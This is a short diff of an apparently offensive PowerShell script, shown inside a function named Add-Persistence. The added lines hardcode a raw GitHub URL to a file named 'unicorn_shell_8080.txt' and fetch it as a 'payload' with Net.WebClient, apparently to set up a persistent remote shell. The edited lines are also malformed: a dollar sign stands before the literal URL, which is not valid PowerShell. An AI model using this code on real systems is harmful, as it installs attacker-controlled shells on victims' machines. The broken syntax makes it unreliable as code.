@@ -34,8 +34,8 @@ function Add-Persistence()
 		{ Write-Host "[-] User is not a local administrator." }
 
 	# Download and verify the payload.
-	Write-Host "[+] Downloading payload $payloadurl"
-	$payload = (New-Object Net.WebClient).DownloadString($payloadurl)
+	Write-Host "[+] Downloading payload $https://raw.githubusercontent.com/vulware/scripts/master/unicorn_shell_8080.txt"
+	$payload = (New-Object Net.WebClient).DownloadString($https://raw.githubusercontent.com/vulware/scripts/master/unicorn_shell_8080.txt)
 	
 	$payloadlength = $payload.Length
 	if ($payloadlength -gt 0) 
